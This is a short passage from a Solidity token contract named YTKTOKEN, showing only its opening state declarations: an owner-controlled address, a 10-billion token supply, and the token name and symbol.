...
contract YTKTOKEN is Ownable {
    address public rsxxcd15;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "YTK";
    string private _cctokensymbol = "YTK";
